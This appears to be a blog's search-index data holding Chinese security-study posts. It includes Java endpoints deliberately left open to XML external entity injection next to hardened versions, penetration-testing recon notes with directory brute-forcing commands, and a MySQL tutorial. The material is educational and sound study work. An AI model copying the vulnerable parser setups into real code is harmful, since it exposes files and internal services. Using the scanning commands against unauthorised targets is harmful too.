&#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST) public String SAXParserSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;SAXParser xxe security code&quot;; &#125; @RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST) public String DigesterVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.parse(new StringReader(body)); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;Digester xxe vuln code&quot;; &#125; @RequestMapping(value = &quot;/Digester/sec&quot;, method = RequestMethod.POST) public String DigesterSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); Digester digester = new Digester(); digester.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); digester.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); digester.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); digester.parse(new StringReader(body)); // parse xml return &quot;Digester xxe security code&quot;; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; /** * Use request.getInputStream to support UTF16 encoding. */ @RequestMapping(value = &quot;/DocumentBuilder/vuln&quot;, method = RequestMethod.POST) public String DocumentBuilderVuln(HttpServletRequest request) &#123; try &#123; DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); InputSource is = new InputSource(request.getInputStream()); Document document = db.parse(is); // parse xml // 遍历xml节点name和value StringBuilder buf = new StringBuilder(); NodeList rootNodeList = document.getChildNodes(); for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList child = rootNode.getChildNodes(); for (int j = 0; j &lt; child.getLength(); j++) &#123; Node node = child.item(j); buf.append(String.format(&quot;%s: %s\\n&quot;, node.getNodeName(), node.getTextContent())); &#125; &#125; return buf.toString(); &#125; catch (Exception e) &#123; e.printStackTrace(); logger.error(e.toString()); return e.toString(); &#125; &#125; @RequestMapping(value = &quot;/DocumentBuilder/Sec&quot;, method = RequestMethod.POST) public String DocumentBuilderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); db.parse(is); // parse xml sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;DocumentBuilder xxe security code&quot;; &#125; @RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST) public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); return &quot;DocumentBuilder xinclude xxe vuln code&quot;; &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; &#125; @RequestMapping(value = &quot;/DocumentBuilder/xinclude/sec&quot;, method = RequestMethod.POST) public String DocumentBuilderXincludeSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml NodeList rootNodeList = document.getChildNodes(); response(rootNodeList); sr.close(); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;DocumentBuilder xinclude xxe vuln code&quot;; &#125; @PostMapping(&quot;/XMLReader/vuln&quot;) public String XMLReaderVuln(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;XMLReader xxe vuln code&quot;; &#125; @PostMapping(&quot;/XMLReader/sec&quot;) public String XMLReaderSec(HttpServletRequest request) &#123; try &#123; String body = WebUtils.getRequestBody(request); logger.info(body); SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); xmlReader.parse(new InputSource(new StringReader(body))); &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;XMLReader xxe security code&quot;; &#125; /** * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY； * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。 */ @PostMapping(&quot;/DocumentHelper/vuln&quot;) public String DocumentHelper(HttpServletRequest req) &#123; try &#123; String body = WebUtils.getRequestBody(req); DocumentHelper.parseText(body); // parse xml &#125; catch (Exception e) &#123; logger.error(e.toString()); return EXCEPT; &#125; return &quot;DocumentHelper xxe vuln code&quot;; &#125; private static void response(NodeList rootNodeList)&#123; for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123; Node rootNode = rootNodeList.item(i); NodeList xxe = rootNode.getChildNodes(); for (int j = 0; j &lt; xxe.getLength(); j++) &#123; Node xxeNode = xxe.item(j); // 测试不能blind xxe，所以强行加了一个回显 logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue()); &#125; &#125; &#125; /** * Receiving POST requests supporting both JSON and XML. * CVE-2018-1259 */ @PostMapping(value = &quot;/xmlbeam/vuln&quot;) HttpEntity&lt;String&gt; post(@RequestBody UserPayload user) &#123; try &#123; logger.info(user.toString()); return ResponseEntity.ok(String.format(&quot;hello, %s!&quot;, user.getUserName())); &#125;catch (Exception e)&#123; e.printStackTrace(); return ResponseEntity.ok(&quot;error&quot;); &#125; &#125; /** * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload. */ @ProjectedPayload public interface UserPayload &#123; @XBRead(&quot;//userName&quot;) String getUserName(); &#125; public static void main(String[] args) &#123; &#125;&#125;","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"渗透测试","slug":"渗透测试","date":"2023-11-13T00:51:31.000Z","updated":"2023-11-14T03:03:34.294Z","comments":true,"path":"2023/11/13/渗透测试/","permalink":"https://erickinyae.github.io/2023/11/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"Stage Description Information Gathering 情报收集，不涉及扫描任何系统 Enumeration&#x2F;Scanning 发现系统运行的应用程序和服务 Exploitation 利用在系统和应用程序上发现的漏洞 Privilege Escalation 提权 Post-exploitation 同网段水平扩展、获取信息、掩盖踪迹 浏览器工具检查检查网页前端源代码，可以从其中获取一些开发环节忘记屏蔽或删除的信息； 调试主要用于开发人员调试JavaScript，作为渗透测试人员，可以让我们以此为入口深入挖掘JavaScript代码； 网络跟踪网页发出的每个外部请求，如果单机”Network“选项卡，然后刷新页面，即可看到该页面请求的所有文件； 内容发现 资源 描述 HTTP Headers 可以通过Http请求头获取一些服务器信息，包括浏览器版本、机器版本、协议等； https://www.wappalyzer.com/ 识别网站使用的技术、包括框架、CMS、支付处理器等，还可以查看版本号； https://archive.org/web/ 网站历史档案，有助于查看某网站停止使用但暂未关闭的历史网站； 自动发现 工具 指令 ffuf ffuf -w &lt;./wordlists&gt; -u &lt;url&gt; dirb dirb &lt;url&gt; &lt;./wordlists&gt; Gobuster gobuster dir --url &lt;url&gt; -w &lt;./wordlists&gt; 子域名发现 利用SSL&#x2F;TLS证书的CA证书颁发机构记录查询某个域名的当前证书和历史结果。 查询地址 https://crt.sh https://ui.ctsearch.entrust.com/ui/ctsearchui 利用搜索引擎发现子域名 Eg: 搜索-&gt; site:*.tryhackme.com 暴力DNS枚举 从预定义的常用子域列表中尝试大量可能的子域。类似的工具有：dnsrecon、DNS bruteforce IDOR - Insecure Direct Object Reference当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）、对输入数据过于信任并且未在服务器端进行验证以确认输入数据时，可能会发生此类漏洞。请求的对象属于请求它的用户。","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://erickinyae.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"安全基础","slug":"安全基础","date":"2023-11-09T05:33:04.000Z","updated":"2023-11-13T00:43:37.376Z","comments":true,"path":"2023/11/09/安全基础/","permalink":"https://erickinyae.github.io/2023/11/09/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/","excerpt":"","text":"资源 地址 描述 https://tryhackme.com/dashboard# 攻击与网络基础 https://tryhackme.com/room/owasptop102021 OWASP TOP10 https://labs.play-with-docker.com/ docker学习 https://cyberdefenders.org/blueteam-ctf-challenges/ 蓝队训练 资讯 地址 描述 https://sec.today/pulses/ 每日安全","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"基础","slug":"基础","permalink":"https://erickinyae.github.io/tags/%E5%9F%BA%E7%A1%80/"}]},{"title":"代码审计LP","slug":"代码审计LP","date":"2023-11-09T02:44:56.000Z","updated":"2023-11-14T02:16:36.039Z","comments":true,"path":"2023/11/09/代码审计LP/","permalink":"https://erickinyae.github.io/2023/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1LP/","excerpt":"","text":"资源审计入门： https://github.com/JoyChou93/java-sec-code 博客： https://skewwg.github.io/ 进阶： 在github中搜java cms项目，拉下来进行代码审计。","categories":[{"name":"安全","slug":"安全","permalink":"https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"审计","slug":"审计","permalink":"https://erickinyae.github.io/tags/%E5%AE%A1%E8%AE%A1/"}]},{"title":"mysql","slug":"mysql","date":"2023-11-06T02:34:30.000Z","updated":"2023-11-13T00:41:56.422Z","comments":true,"path":"2023/11/06/mysql/","permalink":"https://erickinyae.github.io/2023/11/06/mysql/","excerpt":"","text":"基础概念关系型数据库设计规则 关系型数据库的典型数据结构是数据表； 数据在表中，表在库中； 一个数据库可以有多个表，表名是唯一不重复的； 表具有一些属性，定义了数据在表中如何存储； DB、DBMS、SQL的关系 DB：database是一个数据库文件，类似.doc，.txt等； DBMS：数据库管理系统，类似(word、wps工具)； MySQL数据库服务器中安装了MySQL DBMS，使用MySQL DBMS来管理和操作DB，使用的是SQL语言。 自带数据库 information_schema：保存数据库中存在的库、表等信息； mysql：保存相关的配置信息； performance_schema：保存数据库的运行状态信息； sys：系统相关信息； SQL语句分类 DDL：数据定义语言：CREATE\\ALTER\\DROP\\RENAME\\TRUNCATE DML：数据操作语言：INSERT\\DELETE\\UPDATE\\SELECT DCL：数据控制语言：COMMIT\\ROLLBACK\\SAVEPOINT\\GRANT\\REVOKE 语句规范 SQL可以写在一行或多行，为了提高可读性，各句子分开写，必要时使用缩进； 每一条命令以 ;或\\g或\\G 结束； 关键字不能被缩写、也不能被分行； 标点符号方面： 所有 ()、单引号、双引号必须成对结束； 必须使用英文半角输入； 字符串类型和日期时间类型的数据可以使用单引号 &#39;&#39;表示； 列的别名，尽量使用双引号 &quot;&quot;，且不要省略as； 大小写： MySQL在Windows环境下大小写不敏感，在Linux环境下大小写敏感； 数据库名、表名、表别名、变量名严格区分大小写； 关键字、函数名、列名（字段名）、列别名（字段别名）忽略大小写； 推荐的书写规范： 数据库名、表名、表别名、字段名、字段别名都小写； SQL关键字、函数名、绑定变量都大写； 注释 单行注释 #注释文字 单行注释 -- 注释文字 多行注释 /* 注释文字 */ 命名规则 数据库、表名不超过30个字符，变量名限制为29个； 必须只能包含A-Z，a-z，0-9, _共63个字符； 数据库名、表名、字段名等对象名中间不能包含空格； 同一个MySQL软件中，数据库不能同名；同一个库中，表不能同名；同一个表中，字段不能同名； 必须保证字段和保留字、数据库系统或常用方法名不发生冲突，如果必须使用，则必须使用 &#39;&#39;引起来； 保证字段名和类型的一致性，在命名字段并为其制定数据类型的时一定要保证一致性。假如数据类型在一个表中是整数，在另一个表中则不要为字符型； 基本数据类型 种类 类型 整数类型 TINYINT、SMALLINT、MEDIUMINT、INT(或INTEGER)、BIGINT 浮点类型 FLOAT、DOUBLE 定点数类型 DECIMAL 位类型 BIT 日期时间类型 YEAR、TIME、DATE、DATETIME、TIMESTAMP 文本字符串类型 CHAR、VARCHAR、TINYTEXT、TEXT、MEDIUMTEXT、LONGTEXT 枚举类型 ENUM 集合类型 SET 二进制字符串类型 BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB、LONGBLOB JSON类型 JSON对象、JSON数组 空间数据类型 单值：GEOMETRY、POINT、LINESTRING、POLYGON；集合：MULTIPOINT、MULTILINESTRING、MULTIPOLYGON、GEOMETRYCOLLECTION 常用数据类型 数据类型 描述 INT 从-2^31到2^31-1的整型数据。存储大小为 CHAR(size) 定长字符数据。若未指定，默认为1个字符，最大长度255 VARCHAR(size) 可变长字符数据，根据字符串实际长度保存，必须指定长度 FLOAT(M,D) 单精度，占用4个字节，M&#x3D;整数位+小数位，D&#x3D;小数位。 DOUBLE(M,D) 双精度，占用8个字节，D&lt;&#x3D;M&lt;&#x3D;255,0&lt;&#x3D;D&lt;&#x3D;30，默认M+D&lt;&#x3D;15 DECIMAL(M,D) 高精度小数，占用M+2个字节，D&lt;&#x3D;M&lt;&#x3D;65，0&lt;&#x3D;D&lt;&#x3D;30，最大取值范围与DOUBLE相同 DATE 日期型数据，格式’YYYY-MM-DD’ BLOB 二进制形式的长文本数据，最大可达4G TEXT 长文本数据，最大可达4G 库表操作DESC 表名：查看表所有的字段 字段 描述 Field 字段名称 Type 字段类型 Null 表示该属性是否可以存储null值 Key 表示该列是否有索引，如果是PRI则表示该列是表的主键，UNI表示是UNIQUE索引的一部分，MUL表示在列中某个指定值允许出现多次 Default 表示该列是否有默认值，如果有在这里将显示值 Extra 表示可以获取的与给定列有关的附加信息，例如AUTO_INCREMENT等（自增） 数据库创建数据库 代码 描述 CREATE DATABASE 数据库名; 创建数据库 CREATE DATABASE 数据库名 CHARACTER SET 字符集; 创建数据库并指定字符集 CREATE DATABASE IF NOT EXISTS 数据库名; 判断数据库是否已经存在，不存在则创建数据库（ 推荐 ） 使用数据库 代码 描述 SHOW DATABASES; #有一个S，代表多个数据库; 查看当前所有的数据库 SELECT DATABASE(); 查看当前正在使用的数据库 SHOW TABLES FROM 数据库名; 查看指定库下所有的表 SHOW CREATE DATABASE 数据库名;SHOW CREATE DATABASE 数据库名\\G; 查看数据库的创建信息 USE 数据库名; 使用&#x2F;切换数据库 修改数据库 代码 描述 ALTER DATABASE 数据库名 CHARACTER SET 字符集; #比如：gbk、utf8等; 更改数据库字符集 DROP DATABASE 数据库名; 删除指定的数据库 DROP DATABASE IF EXISTS 数据库名; 删除指定的数据库 表创建表创建方法11234567CREATE TABLE [IF NOT EXISTS] 表名(字段1, 数据类型 [约束条件] [默认值],字段2, 数据类型 [约束条件] [默认值],字段3, 数据类型 [约束条件] [默认值],……[表约束条件]); Eg: 1234567891011121314151617181920#Eg1:CREATE TABLE emp (-- int类型emp_id INT,-- 最多保存20个中英文字符emp_name VARCHAR(20),-- 总位数不超过15位salary DOUBLE,-- 日期类型birthday DATE);#Eg2:CREATE TABLE dept(-- int类型，自增deptno INT(2) AUTO_INCREMENT,dname VARCHAR(14),loc VARCHAR(13),-- 主键PRIMARY KEY (deptno)); 创建方法212CREATE TABLE emp1 AS SELECT * FROM employees;CREATE TABLE emp2 AS SELECT * FROM employees WHERE 1=2; -- 创建的emp2是空表 Eg: 12345CREATE TABLE dept80ASSELECT employee_id, last_name, salary*12 ANNSAL, hire_dateFROM employeesWHERE department_id = 80; 查看表 代码 描述 DESC 表名 表结构 SHOW CREATE TABLE 表名 表结构查询 修改表追加列 指令 描述 ALTER TABLE 表名 ADD 【COLUMN】 字段名 字段类型 【FIRST/AFTER 字段名】; Eg: 12ALTER TABLE dept80ADD job_id varchar(15); 修改列 指令 描述 ALTER TABLE 表名 MODIFY 【COLUMN】 字段名1 字段类型 【DEFAULT 默认值】【FIRST/AFTER 字段名】; 可以修改列的数据类型，长度、默认值和位置 Eg: 1234ALTER TABLE dept80MODIFY last_name VARCHAR(30);ALTER TABLE dept80MODIFY salary double(9,2) default 1000; 重命名列 指令 描述 ALTER TABLE 表名 CHANGE 【column】 列名 新列名 新数据类型; Eg: 12ALTER TABLE dept80CHANGE department_name dept_name varchar(15); 删除列 指令 描述 ALTER TABLE 表名 DROP 【COLUMN】字段名 重命名表 指令 描述 RENAME TABLE emp TO myemp; rename ALTER table dept RENAME [TO] detail_dept; alter 删除表 指令 描述 DROP TABLE [IF EXISTS] 数据表1 [, 数据表2, …, 数据表n]; 当一张数据表 没有与其他任何数据表形成关联关系 时，可以将当前数据表直接删除； 清空表 指令 描述 TRUNCATE TABLE detail_dept； 删除表中所有的数据表，释放表的存储空间； TRUNCATE语句不能回滚，而使用 DELETE 语句删除数据，可以回滚； 改 指令 描述 alter table 表名 modify 字段 字段类型 修改字段类型 alter table 表名 add 字段 字段类型 添加新的字段 alter table 表名 add 字段 字段类型 after 字段 添加字段并指定位置 alter table 表名 drop 字段名 删除表字段 alter table 表名 change 原字段名字 新的字段名字 字段类型 修改指定的字段 ALTER DATABASE 数据库名 CHARACTER SET 字符集 修改数据库字符集-&gt; gbk、utf-8 数据操作SELECT 名称 语法 说明 举例 基本语法 SELECT ... FROM ... 属性别名 SELECT ... AS ... FROM ... SELECT last_name &quot;Name&quot;, salary*12 &quot;Annual Salary&quot; FROM employees; 去除重复行 SELECT DISTINCT ... FROM ... 注意，如果DISTINCT后面跟了多个属性，则是根据多个属性的匹配情况进行去重，比如有两个属性id, salary，则id和salary的值都一样，才会去重处理。 SELECT DISTINCT department_id FROM employees; 空值运算 - 所有运算符或列值遇到null值，运算结果都为null（如1+null &#x3D; null） 常数查询 - select可以使用常数查询，来对数据进行分割等行为 SELECT &#39;***&#39; AS corporation, last_name FROM employees; WHERE后的语法 类别 语法 说明 关系 &gt;, &lt;, &gt;=, &lt;=, !=, = 逻辑 OR, AND 区间 id BETWEEN 4 and 6 区间为闭区间，包含左右边界 排序 语法 说明 举例 &#96;SELECT 字段 FROM 表 ORDER BY 字段 排序关键词(DESC ASC)&#96; DESC：降序；ASC：升序； &#96;SELECT 字段 FROM 表 ORDER BY 字段1 DESC ASC, … 字段N DESC ASC&#96; 聚合 语法 说明 举例 sum() 求和 avg() 求平均数 count() 统计数量 select count(sex) from star group by sex max() 求最大值 min() 求最小值 group by 字段 按字段分组 select count(sex) as re,sex from star group by sex having re &gt; 3 select * from 表名 limit 偏移量,数量 偏移量，如果不写偏移量的话默认是0；实现分页查询的时候必须写偏移量； 多表联合查询 类型 说明 描述 语法 内连接 隐式内连接 select username,name from user,goods where user.gid=gods.gid 内连接 显式内连接 select username,from user inner join goods on user.gid=goods.gidselect * from user left join goods on user.gid=goods.gid 外连接 左连接 包含所有的左边表中的记录以及右边表中没有和他匹配的记录 外连接 右连接 select * from user right jOin goods on user.gid=goods.gid 子嵌套查询 select * from user where gid in(select gid from goods) 数据联合查询 将两次查询的结果联合到一起 select * from user left join goods on user.gid=goods.gid union select * from user right join goods on user.gid=goods.gid 两个表同时更新 update user u, goods g set u.gid=12,g.price=1 where u.id=2 and u.gid=g.gid 运算符算术运算符 运算符 名称 作用 示例 + 加法 计算两个值或表达式的和 SELECT A+B - 减法 计算两个值或表达式的差 SELECT A-B * 乘法 计算两个值或表达式的乘积 SELECT A*B &#x2F;或DIV 除法 计算两个值或者表达式的商 SELECT A&#x2F;B or SELECT A DIV B %或MOD 求模（求余） 计算两个值的余数 SELECT A%B or SELECT A MOD B 加减 整数与浮点数进行加法和减法，结果是一个浮点数； 在MySQL中+只表示数值相加，如果遇到非数值类型，先尝试转成数值，如果转失败，则按0计算； MySQL字符串拼接使用字符串函数CONCAT()实现。 乘除 一个整数乘除一个浮点数1都变成浮点数，数值与原数相等； 一个数除以整数后，无论是否除尽，结果都为一个浮点数； 一个数除以另一个数，除不尽时，结果为一个浮点数，且保留到小数点后四位； MySQL中一个数除以0为NULL； 比较运算符 运算符 名称 &#x3D; 等于 &lt;&#x3D;&gt; 安全等于 &lt;&gt;(!&#x3D;) 不等于 &lt; 小于 &lt;&#x3D; 小于等于 &gt; 大于 &gt;&#x3D; 大于等于 字符串和字符串比较，比较的是内容； 整数和整数比较，比较的是值； 整数和字符串比较，将会将字符串转换为数字进行比较； 等号两边如果有一个NULL，则比较结果为NULL； 非符号运算符 运算符 名称 描述 举例 IS NOT NULL 不为空运算符 判断值、字符串或表达式是否不为空 SELECT B FROM TABLE WHERE A IS NOT NULL LEAST 最小值运算符 在多个值中返回最小值 SELECT D FROM TABLE WHERE C LEAST(A, B) GREATEST 最大值运算符 在多个值中返回最大值 SELECT D FROM TABLE WHERE C GREATEST(A, B) BETWEEN * AND * 两个值之间的运算符 判断一个值是否在两个值之间 SELECT D FROM TABLE WHERE C BETWEEN A AND B IS NULL 为空运算符 判断一个值、字符串或表达式是否为空 SELECT B FROM TABLE WHERE A IS NULL IN 属于运算符 判断一个值是否在列表中 SELECT D FROM TABLE WHERE C IN (A, B) NOT IN 不属于运算符 判断一个值是否不在列表中 SELECT D FROM TABLE WHERE C NOT IN (A, B) LIKE 模糊匹配运算符 判断一个值是否符合模糊匹配规则 SELECT C FROM TABLE WHERE A LIKE B REGEXP 正则表达式运算符 判断一个值是否符合正则表达式规则 SELECT C FROM TABLE WHERE A REGEXP B RLIKE 正则表达式运算符 判断一个值是否符合正则表达式规则 SELECT C FROM TABLE WHERE A RLIKE B LIKE模糊匹配运算符： %：匹配0个或多个字符； _：只能匹配一个字符； 运算符优先级数值越高，优先级越高。 优先级 运算符 1 &#x3D;（赋值） 2 ||、OR、XOR 3 &amp;&amp;，AND 4 NOT 5 BETWEEN、CASE、WHEN、THEN和ELSE 6 &#x3D;、&lt;&#x3D;&gt;、&gt;&#x3D;、&gt;、&lt;&#x3D;、&lt;、&lt;&gt;、!&#x3D;、 IS、LIKE、REGEXP和IN 7 | 8 &amp; 9 &lt;&lt;和&gt;&gt; 10 -和+ 11 *、&#x2F;、DIV、%和MOD 12 ^ 13 -(负号)和~(按位取反) 14 ! 15 () 分页查询格式： 1Limit [位置偏移量, ] 行数 Eg： 1234567#前10条记录:SELECT * FROM table_name LIMIT 0, 10;SELECT * FROM table_name LIMIT 10;#第11至20条记录:SELECT * FROM table_name LIMIT 10,10;#第21至30条记录:SELECT * FROM table_name LIMIT 20,10; 分页显式公式： 1SELECT * FROM table_name LIMIT(PageNo - 1)*PageSize, PageSize; 多表查询自连接将同一个表分别取两个别名赋予不同的含义（类比快捷方式），然后再将两个表进行内连接、外连接等查询； 1234SELECT CONCAT(worker.last_name ,&#x27; works for &#x27;, manager.last_name)FROM employees worker, employees managerWHERE worker.manager_id = manager.employee_id 内连接与外连接 内连接：合并具有同一列的两个以上的表行，结果集中不包含一个表和另一个表不匹配的行； 外连接：除了返回满足连接条件的行以外还返回左（或右）表中不满足条件的行，称为左连接或右连接，没有匹配的行时，表中相应的列为NULL； 如果左外连接，左表为主表，右表为从表； 如果右外连接，右表为主表，左表为从表； JOIN…ON1234SELECT table1.column, table2.column,table3.columnFROM table1JOIN table2 ON table1 和 table2 的连接条件JOIN table3 ON table2 和 table3 的连接条件 INNER JOIN通常写的JOIN就是INNER JOIN，将INNER省略掉了而已，即INNER JOIN ≈ JOIN； 1234SELECT 字段列表FROM A表 INNER JOIN B表ON 关联条件WHERE 等其他子句; OUTER JOINLEFT OUTER JOIN1234SELECT 字段列表FROM A表 LEFT JOIN B表ON 关联条件WHERE 等其他子句; Eg: 1234SELECT e.last_name, e.department_id, d.department_nameFROM employees eLEFT OUTER JOIN departments dON (e.department_id = d.department_id) ; RIGHT OUTER JOIN123FROM A表 RIGHT JOIN B表ON 关联条件WHERE 等其他子句; Eg: 1234SELECT e.last_name, e.department_id, d.department_nameFROM employees eRIGHT OUTER JOIN departments dON (e.department_id = d.department_id) ; UNION 合并查询结果，利用UNION 关键词可以给出多条SELECT语句，并将它们的结果组合成单个结果集； 合并时两个查询结果的列数和数据类型必须相同，并以“串联”形式进行组合。 123SELECT column,... FROM table1UNION [ALL]SELECT column,... FROM table2 Eg: 123456#方式一：SELECT * FROM employees WHERE email LIKE &#x27;%a%&#x27; OR department_id&gt;90;#方式二：SELECT * FROM employees WHERE email LIKE &#x27;%a%&#x27;UNIONSELECT * FROM employees WHERE department_id&gt;90; UNION和UNION ALL UNION操作符会将两个查询的结果集并集时去除重复记录； UNION ALL操作符返回两个查询的结果集的并集但并不去除重复部分。 NATURAL JOIN它会帮你自动查询两张连接表中所有相同的字段 ，然后进行等值连接 。 12345678#原语句SELECT employee_id,last_name,department_nameFROM employees e JOIN departments dON e.`department_id` = d.`department_id`AND e.`manager_id` = d.`manager_id`#利用NUTURAL JOIN改写为SELECT employee_id,last_name,department_nameFROM employees e NATURAL JOIN departments d; USING当我们进行连接的时候，SQL99还支持使用 USING 指定数据表里的 同名字段 进行等值连接。但是只能配合JOIN一起使用。比如： 123SELECT employee_id,last_name,department_nameFROM employees e JOIN departments dUSING (department_id); 你能看出与自然连接 NATURAL JOIN 不同的是，USING 指定了具体的相同的字段名称，你需要在 USING的括号 () 中填入要指定的同名字段。同时使用 JOIN…USING 可以简化 JOIN ON 的等值连接。它与下面的 SQL 查询结果是相同的 123SELECT employee_id,last_name,department_nameFROM employees e ,departments dWHERE e.department_id = d.department_id 子查询 子查询（内查询）在主查询之前一次执行完成； 子查询的结果被主查询（外查询）使用 ； 子查询要包含在括号内； 将子查询放在比较条件的右侧； 单行操作符对应单行子查询，多行操作符对应多行子查询； 单行子查询比较操作符 语法 说明 &#x3D; equal to &gt; greater than &gt;&#x3D; greater than or equal to &lt; less than &lt;&#x3D; less than or equal to &lt;&gt; not equal to 多行子查询比较操作符 语法 说明 IN 等于列表中的任意一个 ANY 需要和单行比较操作符一起使用，和子查询返回的某一个值比较 ALL 需要和单行比较操作符一起使用，和子查询返回的所有值比较 SOME 实际上是ANY的别名，作用相同，一般常使用ANY 计算列 mysql8.0新特性 123456CREATE TABLE tb1(id INT,a INT,b INT,c INT GENERATED ALWAYS AS (a + b) VIRTUAL); INSERT 语法 说明 insert into 表名 values(值1，值2，…) 很少用 insert into 表名(字段1，字段2…) values(值1，值2，….) 常用 insert into 表名(字段1，字段2…) values(值1，值2，….)，(值1，值2，….)，(值1，值2，….) DELETE 语法 说明 delete from 表名 where 条件 where 条件必须加，否则数据会被全部删除 UPDATE 语法 说明 update 表名 set 字段1 &#x3D; 值1, 字段2 &#x3D; 值2 where 条件 DCL权限控制 描述 指令 说明 创建用户 CREATE USER &#39;用户名&#39;@&#39;客户端地址&#39; IDENTIFIED BY &#39;密码&#39; 授权用户 GRANT 权限 ON 数据库名.表名 TO &#39;用户名&#39;@&#39;主机名&#39; IDENTIFIED BY &#39;密码&#39; 上述命令中，权限可以是SELECT、INSERT、UPDATE、DELETE等操作，也可以是ALL表示所有操作。数据库名和表名可以使用通配符*表示所有，用户名和主机名也可以使用通配符%表示所有。IDENTIFIED BY后面紧跟的是密码。 刷新权限 flush privileges 取消授权 revoke all on test.* from &#39;xiaoming&#39;@&#39;localhost&#39; 上述命令中，权限可以是SELECT、INSERT、UPDATE、DELETE等操作，也可以是ALL表示所有操作。数据库名和表名可以使用通配符*表示所有，用户名和主机名也可以使用通配符%表示所有。IDENTIFIED BY后面紧跟的是密码。 删除用户 drop user&#39;xiaoming&#39;@&#39;localhost&#39; 